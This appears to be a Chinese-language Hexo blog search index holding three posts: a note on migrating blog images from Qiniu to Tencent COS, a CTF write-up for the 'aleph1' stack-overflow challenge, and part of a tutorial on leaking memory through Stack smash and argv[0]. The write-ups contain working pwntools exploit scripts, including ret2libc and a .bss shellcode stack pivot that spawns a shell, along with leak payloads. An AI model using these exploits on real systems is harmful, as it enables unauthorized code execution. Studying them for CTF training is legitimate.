<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[博客图床迁移]]></title>
      <url>/2018/1029/blog-map-migration/</url>
      <content type="html"><![CDATA[<p>博客搭建的时候选择了七牛云作为图床，到目前为止往上传了大概 100 张图片。近日收到七牛云测试域名回收的通知，只好另选其它云存储作为博客图床，网络上已有图床迁移方法，遂参考并记录于此。</p>
<h1 id="0x01-下载图片"><a href="#0x01-下载图片" class="headerlink" title="0x01 下载图片"></a>0x01 下载图片</h1><p>七牛云提供命令行工具 <a href="https://developer.qiniu.com/kodo/tools/1302/qshell#2" target="_blank" rel="external">qshell</a> 操作对象存储，可以使用该工具将已有数据同步到本地。</p>
<h2 id="1-密钥设置"><a href="#1-密钥设置" class="headerlink" title="1. 密钥设置"></a>1. 密钥设置</h2><p>首先需要设置密钥，密钥 <code>ak</code> 与 <code>sk</code> 可在“个人面板/密钥管理”中查看。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ qshell account ak sk</div></pre></td></tr></table></figure></p>
<h2 id="2-同步数据"><a href="#2-同步数据" class="headerlink" title="2. 同步数据"></a>2. 同步数据</h2><p>使用 <a href="https://github.com/qiniu/qshell/blob/master/docs/qdownload.md" target="_blank" rel="external">qdownload</a> 命令可将图片同步到本地，该功能是收费的，但是通过设置 <code>cdn_domain</code> 参数可免费使用 10G 的流量。该命令使用方法如下，其中 <code>LocalDownloadConfig</code> 为本地下载的配置文件。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ qshell qdownload [&lt;ThreadCount&gt;] &lt;LocalDownloadConfig&gt;</div></pre></td></tr></table></figure></p>
<p>为能使用免费流量，新建如下配置文件，其中 <code>bucket</code> 为存储空间名称，<code>cdn_domain</code> 为需同步存储空间的外部默认域名。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    <span class="string">"dest_dir"</span>   :   <span class="string">"/home/lc/Desktop/images"</span>,</div><div class="line">    <span class="string">"bucket"</span>     :   <span class="string">"hexo"</span>,</div><div class="line">    <span class="string">"prefix"</span>     :   <span class="string">""</span>,</div><div class="line">    <span class="string">"suffixes"</span>   :   <span class="string">""</span>,</div><div class="line">    <span class="string">"cdn_domain"</span> :   <span class="string">"http://ooyovxue7.bkt.clouddn.com"</span>,</div><div class="line">    <span class="string">"referer"</span>    :   <span class="string">""</span>,</div><div class="line">    <span class="string">"log_file"</span>   :   <span class="string">"download.log"</span>,</div><div class="line">    <span class="string">"log_level"</span>  :   <span class="string">"info"</span>,</div><div class="line">    <span class="string">"log_rotate"</span> :   <span class="number">1</span>,</div><div class="line">    <span class="string">"log_stdout"</span> :   false</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>命令执行完后，所有图片将下载到 <code>dest_dir</code> 设定的目录中。</p>
<h1 id="0x02-腾讯云-COS"><a href="#0x02-腾讯云-COS" class="headerlink" title="0x02 腾讯云 COS"></a>0x02 腾讯云 COS</h1><h2 id="1-上传图片"><a href="#1-上传图片" class="headerlink" title="1. 上传图片"></a>1. 上传图片</h2><p>首先创建存储空间，并设置访问权限为<strong>公有读私有写</strong>，创建好后将下载的图片批量上传至 COS。为方便替换已有文章中图片链接，应保留七牛云中数据的文件夹结构。</p>
<p>此外，为了防止盗链导致免费流量被耗尽，需要设置防盗链，将博客域名加入白名单中。但设置之后，本地文章中无法正常访问图片，所以酌情设置该功能。</p>
<h2 id="2-修改链接"><a href="#2-修改链接" class="headerlink" title="2. 修改链接"></a>2. 修改链接</h2><p>将图片上传到腾讯云 COS 之后，即可正常访问这些图片。接下来需要修改已有文章中的图片链接，将链接中的七牛云域名 <code>old_domain_name</code> 替换为腾讯云域名 <code>new_domain_name</code>（在“基础配置/访问域名”中查看），下面使用 <code>sed</code> 命令进行批量修改。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sed -i <span class="string">'s#($old_domain_name#($new_domain_name#g'</span> /path_to_blog/source/_posts/*.md</div></pre></td></tr></table></figure></p>
<p>所有链接修改完后，博客图床迁移便完成了。</p>
<h1 id="0x03-PicGo"><a href="#0x03-PicGo" class="headerlink" title="0x03 PicGo"></a>0x03 PicGo</h1><p><a href="https://molunerfinn.com/PicGo/" target="_blank" rel="external">PicGo</a> 是一款图片上传工具，可支持多种图床，其中包括腾讯云 COS。配置方法参看 <a href="https://github.com/Molunerfinn/PicGo/wiki/%E8%AF%A6%E7%BB%86%E7%AA%97%E5%8F%A3%E7%9A%84%E4%BD%BF%E7%94%A8#%E8%85%BE%E8%AE%AF%E4%BA%91cos" target="_blank" rel="external">官方文档</a>，由于主账户权限较大，基于安全考虑，建议新建一个子账户，并对该子账户只授予 COS 读写权限，具体设置方法参考 <a href="https://cloud.tencent.com/document/product/436/11714" target="_blank" rel="external">使用子账号对 COS 进行授权</a>。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/20181029174328.png" alt=""></p>
<hr>
<p>References:<br>[1] <a href="https://sjq597.github.io/2018/10/13/%E4%B8%83%E7%89%9B%E6%B5%8B%E8%AF%95%E5%9F%9F%E5%90%8D%E5%9B%9E%E6%94%B6%E8%BF%81%E7%A7%BB%E5%8D%9A%E5%AE%A2%E5%9B%BE%E5%BA%8A%E5%88%B0%E8%85%BE%E8%AE%AF%E4%BA%91/" target="_blank" rel="external">七牛测试域名回收迁移博客图床到腾讯云</a><br>[2] <a href="https://jdhao.github.io/2018/10/20/qiuniu_migrate_to_tencent_cos/" target="_blank" rel="external">把博客图床从七牛云迁移到腾讯云</a>  </p>
]]></content>
      
        <categories>
            
            <category> Others </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 图床 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[2018 铁人三项赛 aleph1 Writeup]]></title>
      <url>/2018/1029/2018-triathlon-aleph1-writeup/</url>
      <content type="html"><![CDATA[<h1 id="0x01-漏洞位置"><a href="#0x01-漏洞位置" class="headerlink" title="0x01 漏洞位置"></a>0x01 漏洞位置</h1><p>程序很简单，调用 fgets() 从 stdin 中读取 1337 bytes 数据到 yolo 数组中，由于 yolo 内存空间为 1024 bytes，但输入数据长度大于 1024 时会导致栈溢出。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> yolo[<span class="number">1024</span>]; <span class="comment">// [rsp+0h] [rbp-400h]</span></div><div class="line"></div><div class="line">  fgets(yolo, <span class="number">1337</span>, _bss_start);</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02. 漏洞利用"></a>0x02. 漏洞利用</h1><p>首先，检查程序开启的安全机制，发现没有开任何安全机制。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">➜  aleph checksec aleph1</div><div class="line">[*] <span class="string">'/home/lc/t3pwn/aleph/aleph1'</span></div><div class="line">    Arch:     amd64<span class="number">-64</span>-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX disabled</div><div class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</div><div class="line">    RWX:      Has RWX segments</div></pre></td></tr></table></figure></p>
<h2 id="1-第一次尝试"><a href="#1-第一次尝试" class="headerlink" title="1. 第一次尝试"></a>1. 第一次尝试</h2><p>由于题目给了 libc 文件，所以可以尝试 ret2libc 进行利用。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line">p = process([<span class="string">'./aleph1'</span>], env = &#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc64"</span>&#125;)</div><div class="line"><span class="comment">#p = remote("202.1.14.12", 40001)</span></div><div class="line">system_add = p64(<span class="number">0x7ffff7a52390</span>)</div><div class="line">poprdi_add = p64(<span class="number">0x0000000000400663</span>)</div><div class="line">bash_add = p64(<span class="number">0x7ffff7b99d57</span>)</div><div class="line"></div><div class="line">raw_input(<span class="string">"send"</span>)</div><div class="line">payload = <span class="number">1032</span>* <span class="string">"A"</span> +  poprdi_add + bash_add + system_add</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
<p>但很不幸，服务器开启了 ASLR，libc 加载基址的随机化会使得 libc 中 system 函数地址和 “/bin/sh” 字符串地址发生变化，导致利用失败。</p>
<h2 id="2-第二次尝试"><a href="#2-第二次尝试" class="headerlink" title="2. 第二次尝试"></a>2. 第二次尝试</h2><p>由于开启了 ASLR，利用过程就不能依赖堆栈以及内存中共享库的地址。程序汇编代码如下：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">.text:00000000004005CA                 push    rbp</div><div class="line">.text:00000000004005CB                 mov     rbp, rsp</div><div class="line">.text:00000000004005CE                 sub     rsp, 400h</div><div class="line">.text:00000000004005D5 ; 4:   fgets(yolo, 1337, _bss_start);</div><div class="line">.text:00000000004005D5                 mov     rdx, cs:__bss_start ; stream</div><div class="line">.text:00000000004005DC                 lea     rax, [rbp+yolo]</div><div class="line">.text:00000000004005E3                 mov     esi, 539h       ; n</div><div class="line">.text:00000000004005E8                 mov     rdi, rax        ; s</div><div class="line">.text:00000000004005EB                 call    _fgets</div><div class="line">.text:00000000004005F0 ; 5:   return 0;</div><div class="line">.text:00000000004005F0                 mov     eax, 0</div><div class="line">.text:00000000004005F5                 leave</div><div class="line">.text:00000000004005F6                 retn</div><div class="line">                                        ...</div><div class="line">.bss:0000000000601030 __bss_start     dq ?                    ; DATA XREF: LOAD:0000000000400350↑o</div><div class="line">.bss:0000000000601030                                         ; deregister_tm_clones+1↑o ...</div><div class="line">.bss:0000000000601030                                         ; Alternative name is '__TMC_END__'</div><div class="line">.bss:0000000000601030                                         ; stdin@@GLIBC_2.2.5</div><div class="line">.bss:0000000000601030                                         ; _edata</div></pre></td></tr></table></figure></p>
<p>分析汇编代码后发现，通过两次输入可以把 shellcode 写入 .bss 段中，然后跳转到 .bss 段执行 shellcode，具体思路如下：</p>
<ol>
<li>利用 fgets() 写内存溢出，把 rbp 寄存器修改到 .bss 段的 0x601440(0x601030 + 0x400 + 0x10) 地址处，其中，0x400 为 yolo 的内存大小，偏移0x10 是为了不破坏 .bss 中 stdin 的值 ；同时，把返回地址覆盖为 0x4005D5，以便进行第二次调用 fgets() 进行写内存。</li>
<li>利用第二次调用 fgets() 把 shellcode 写入 .bss 中，由于 rbp 被修改到 .bss 段的 0x601440，所以会把数据写入到 0x601040（ [rbp - 0x400] ）；同时，把返回地址覆盖为 shellcode 地址 0x601040。</li>
<li>最终 ret 时跳转到 shellcode 执行。</li>
</ol>
<p>利用脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">"./aleph1"</span>)</div><div class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</div><div class="line"></div><div class="line">bss_start = <span class="number">0x601030</span></div><div class="line">rbp = bss_start + <span class="number">0x400</span> + <span class="number">0x10</span></div><div class="line">ret_addr = <span class="number">0x4005D5</span></div><div class="line">payload1 = <span class="number">1024</span>*<span class="string">"A"</span> + p64(rbp) + p64(ret_addr)</div><div class="line">p.sendline(payload1)</div><div class="line"></div><div class="line">shellcode = asm(shellcraft.sh())</div><div class="line">sc_addr = bss_start + <span class="number">0x10</span></div><div class="line">payload2 = shellcode + (<span class="number">1024</span> + <span class="number">8</span> - len(shellcode))*<span class="string">"A"</span> + p64(sc_addr)</div><div class="line">p.sendline(payload2)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> Exploit </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[栈溢出 Stack smash 利用]]></title>
      <url>/2018/1013/stack-overflow-smash-utilization/</url>
      <content type="html"><![CDATA[<p>在 Linux 系统应用程序中部署 Canary 漏洞缓解机制可有效防御栈溢出漏洞的攻击，然而在一定环境下，攻击者可利用该机制泄露内存信息，实现进一步的攻击。</p>
<h1 id="0x01利用思路"><a href="#0x01利用思路" class="headerlink" title="0x01利用思路"></a>0x01利用思路</h1><h2 id="1-Stack-smash"><a href="#1-Stack-smash" class="headerlink" title="1. Stack smash"></a>1. Stack smash</h2><p>Linux 系统中，为了防御栈溢出漏洞的利用，通常会部署 Canary 漏洞缓解措施。Wiki 中对 Canary 的解释如下：</p>
<blockquote>
<p>Canaries or canary words are known values that are placed between a buffer and control data on the stack to monitor buffer overflows. When the buffer overflows, the first data to be corrupted will usually be the canary, and a failed verification of the canary data will therefore alert of an overflow, which can then be handled, for example, by invalidating the corrupted data.</p>
</blockquote>
<p>下面简单描述下 Canary 的原理。对于栈溢出漏洞的利用，最简单的方法就是通过溢出数据修改栈中函数返回地址为目标内存地址，当函数返回时将会跳转到目标内存处执行指令，从而实现控制流劫持。为了防御这种利用方法，分配栈空间时在 EBP-4 的位置存放一个 Canary 值，函数返回之前会校验该值是否被修改，若检测到被修改则调用 <code>__stack_chk_fail</code> 函数抛出异常并结束进程。可见，要覆盖函数返回地址必须修改 Canary，从而可防御该攻击方法。gcc 编译器默认开启该缓解机制，编译时可用 <code>-fno-stack-protector</code> 选项关闭该机制。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"> Low Address |                 |</div><div class="line">             +-----------------+</div><div class="line">     esp =&gt;  | local variables |</div><div class="line">             +-----------------+</div><div class="line">             |    buf[0-3]     |</div><div class="line">             +-----------------+</div><div class="line">             |    buf[4-7]     |</div><div class="line">             +-----------------+</div><div class="line">             |     canary      |</div><div class="line">             +-----------------+</div><div class="line">     ebp =&gt;  |     old ebp     |</div><div class="line">             +-----------------+</div><div class="line">             |   return addr   |</div><div class="line">             +-----------------+</div><div class="line">             |      args       |</div><div class="line">             +-----------------+</div><div class="line">High Address |                 |</div></pre></td></tr></table></figure></p>
<p>libc 中 <code>__stack_chk_fail</code> 的源码如下，该函数调用 <code>__fortify_fail</code> 输出异常信息，其中包含  libc_argv[0] 指向的程序名。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>)</div><div class="line">&#123;</div><div class="line">  __fortify_fail (<span class="string">"stack smashing detected"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</div><div class="line">&#123;</div><div class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></div><div class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</div><div class="line">    __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminatedn"</span>,</div><div class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>若通过栈溢出漏洞可修改栈内存中 argv[0] 指针，那么触发 Stack smash 时可泄露内存信息。例如把 argv[0] 修改为 got 表项可泄露出内存中函数地址，为进一步利用提供条件。</p>
<h2 id="2-environ"><a href="#2-environ" class="headerlink" title="2. environ"></a>2. environ</h2><p>在 Linux 系统中，glibc 的环境指针 environ(environment pointer) 为程序运行时所需要的环境变量表的起始地址，环境表中的指针指向各环境变量字符串。从以下结果可知环境指针 environ 在栈空间的高地址处。因此，<strong>可通过 environ 指针泄露栈地址</strong>。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ vmmap</div><div class="line">Start              End                Perm      Name</div><div class="line">0x00400000         0x00401000         r-xp      /home/lc/Desktop/guess/guess</div><div class="line">0x00601000         0x00602000         r--p      /home/lc/Desktop/guess/guess</div><div class="line">0x00602000         0x00603000         rw-p      /home/lc/Desktop/guess/guess</div><div class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp      /lib/x86_64-linux-gnu/libc-2.23.so</div><div class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 ---p      /lib/x86_64-linux-gnu/libc-2.23.so</div><div class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 r--p      /lib/x86_64-linux-gnu/libc-2.23.so</div><div class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p      /lib/x86_64-linux-gnu/libc-2.23.so</div><div class="line">0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p      mapped</div><div class="line">0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp      /lib/x86_64-linux-gnu/ld-2.23.so</div><div class="line">0x00007ffff7fdb000 0x00007ffff7fde000 rw-p      mapped</div><div class="line">0x00007ffff7ff7000 0x00007ffff7ffa000 r--p      [vvar]</div><div class="line">0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp      [vdso]</div><div class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 r--p      /lib/x86_64-linux-gnu/ld-2.23.so</div><div class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p      /lib/x86_64-linux-gnu/ld-2.23.so</div><div class="line">0x00007ffff7ffe000 0x00007ffff7fff000 rw-p      mapped</div><div class="line">0x00007ffffffde000 0x00007ffffffff000 rw-p      [stack]</div><div class="line">0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]</div><div class="line">gdb-peda$ print environ</div><div class="line">$1 = (char **) 0x7fffffffdc98</div><div class="line">gdb-peda$ telescope 0x7fffffffdc98</div><div class="line">0000| 0x7fffffffdc98 --&gt; 0x7fffffffe0ae ("XDG_SESSION_ID=c2")</div><div class="line">0008| 0x7fffffffdca0 --&gt; 0x7fffffffe0c0 ("QT_LINUX_ACCESSIBILITY_ALWAYS_ON=1")</div><div class="line">0016| 0x7fffffffdca8 --&gt; 0x7fffffffe0e3 ("UNITY_DEFAULT_PROFILE=unity")</div><div class="line">0024| 0x7fffffffdcb0 --&gt; 0x7fffffffe0ff ("GNOME_KEYRING_PID=")</div><div class="line">0032| 0x7fffffffdcb8 --&gt; 0x7fffffffe112 ("GNOME_KEYRING_CONTROL=")</div><div class="line">0040| 0x7fffffffdcc0 --&gt; 0x7fffffffe129 ("DEFAULTS_PATH=/usr/share/gconf/ubuntu.default.path")</div><div class="line">0048| 0x7fffffffdcc8 --&gt; 0x7fffffffe15c ("LOGNAME=lc")</div><div class="line">0056| 0x7fffffffdcd0 --&gt; 0x7fffffffe167 ("INSTANCE=")</div></pre></td></tr></table></figure></p>
<h1 id="0x02-实例分析"><a href="#0x02-实例分析" class="headerlink" title="0x02 实例分析"></a>0x02 实例分析</h1><p>下面通过调试 <a href="https://github.com/0x4C43/Linux-Exploit/tree/master/stack_smash" target="_blank" rel="external">网鼎杯的 pwn-GUESS</a> 的利用过程说明 Stack smash 利用方法。</p>
<h2 id="1-漏洞位置"><a href="#1-漏洞位置" class="headerlink" title="1. 漏洞位置"></a>1. 漏洞位置</h2><p>程序首先将 flag 读入内存中的 buf，用户有 3 次猜测 flag 的机会。通过 gets() 读取用户输入时存在栈溢出漏洞。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></div><div class="line">&#123;</div><div class="line">  ...</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"This is GUESS FLAG CHALLENGE!"</span>);</div><div class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( v6 &gt;= v7 )</div><div class="line">    &#123;</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"you have no sense... bye :-) "</span>);</div><div class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</div><div class="line">    &#125;</div><div class="line">    v5 = sub_400A11();</div><div class="line">    <span class="keyword">if</span> ( !v5 )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    ++v6;</div><div class="line">    wait((__WAIT_STATUS)&amp;stat_loc);</div><div class="line">  &#125;</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Please type your guessing flag"</span>);</div><div class="line">  gets(&amp;s2);         <span class="comment">// overflow</span></div><div class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;buf, &amp;s2) )</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"You must have great six sense!!!! :-o "</span>);</div><div class="line">  <span class="keyword">else</span></div><div class="line">    <span class="built_in">puts</span>(<span class="string">"You should take more effort to get six sence, and one more challenge!!"</span>);</div><div class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h2><p>首先查看程序开启的漏洞缓解机制，发现已开启 Canary 和 NX，未开启 PIE。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ checksec </div><div class="line">CANARY    : ENABLED</div><div class="line">FORTIFY   : disabled</div><div class="line">NX        : ENABLED</div><div class="line">PIE       : disabled</div><div class="line">RELRO     : Partial</div></pre></td></tr></table></figure></p>
<p>由于程序中 sub_400A11() 函数使用 fork 子进程的方式允许用户有 3 次猜测 flag 的机会，同时又将 flag 读入栈中，因此可利用 Stack smash 进行 3 次内存泄漏获得 flag。具体利用思路如下：</p>
<ul>
<li>通过栈溢出漏洞覆盖 argv[0] 为 <code>__libc_start_main</code> 的 got 表项，触发 Stack smash 可泄露 <code>__libc_start_main</code> 函数地址，利用给出的 libc 文件可计算得到 libc 基地址；</li>
<li>计算出 environ 在内存中的地址，第二次利用栈溢出漏洞覆盖 argv[0] 为 <code>environ</code> ，泄露出 environ 的值，即指向环境变量的栈地址；</li>
<li>根据栈内存中 flag 与 environ 值的偏移量计算出 flag 的栈地址，再次利用栈溢出漏洞覆盖 argv[0] 为 flag 的栈地址，从而可读取 flag 的值。</li>
</ul>
<h3 id="1）泄露-libc-基址"><a href="#1）泄露-libc-基址" class="headerlink" title="1）泄露 libc 基址"></a>1）泄露 libc 基址</h3><p>首先，从下图栈内存信息可知缓冲区 s2 地址为 0x7fffffffdb60， argv[0] 地址为 0x7fffffffdc88，从而可计算出 s2 与 argv[0] 间的偏移量为 0x128（0x7fffffffdc88-0x7fffffffdb60）。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x400b1b:    mov    rdi,rax</div><div class="line">   0x400b1e:    mov    eax,0x0</div><div class="line">   0x400b23:    call   0x400830 &lt;gets@plt&gt;</div><div class="line">=&gt; 0x400b28:    lea    rdx,[rbp-0x40]</div><div class="line">   0x400b2c:    lea    rax,[rbp-0x70]</div><div class="line">   0x400b30:    mov    rsi,rdx</div><div class="line">   0x400b33:    mov    rdi,rax</div><div class="line">   0x400b36:    call   0x400820 &lt;strcmp@plt&gt;</div><div class="line">[------------------------------------------------------------------------------]</div><div class="line">Legend: code, data, rodata, value</div><div class="line">0x0000000000400b28 in ?? ()</div><div class="line">gdb-peda$ stack 20</div><div class="line">0000| 0x7fffffffdb00 --&gt; 0x7fffffffdc88 --&gt; 0x7fffffffe091 ("/home/lc/Desktop/guess/guess")</div><div class="line">0008| 0x7fffffffdb08 --&gt; 0x100000000 </div><div class="line">0016| 0x7fffffffdb10 --&gt; 0x0 </div><div class="line">0024| 0x7fffffffdb18 --&gt; 0x3 </div><div class="line">0032| 0x7fffffffdb20 --&gt; 0x0 </div><div class="line">0040| 0x7fffffffdb28 --&gt; 0x3 </div><div class="line">0048| 0x7fffffffdb30 ("flag&#123;43861991f7e943090e257863eec75961&#125;\n")</div><div class="line">0056| 0x7fffffffdb38 ("61991f7e943090e257863eec75961&#125;\n")</div><div class="line">0064| 0x7fffffffdb40 ("943090e257863eec75961&#125;\n")</div><div class="line">0072| 0x7fffffffdb48 ("57863eec75961&#125;\n")</div><div class="line">0080| 0x7fffffffdb50 --&gt; 0xa7d3136393537 ('75961&#125;\n')</div><div class="line">0088| 0x7fffffffdb58 --&gt; 0x0 </div><div class="line">0096| 0x7fffffffdb60 ('A' &lt;repeats 16 times&gt;)</div><div class="line">0104| 0x7fffffffdb68 ("AAAAAAAA")</div><div class="line">0112| 0x7fffffffdb70 --&gt; 0x0</div></pre></td></tr></table></figure></p>
<p>因此可构造以下 payload 将 argv[0] 覆盖为 <code>__libc_start_main</code> 的 got 表项，可泄露出 <code>__libc_start_main</code> 函数在内存中的地址，从而计算出 libc 的基址。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">payload = <span class="string">'A'</span> * <span class="number">0x128</span> + p64(libc_start_main_got)</div><div class="line">libc_base_addr = libc_start_main_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]</div></pre></td></tr></table></figure></p>
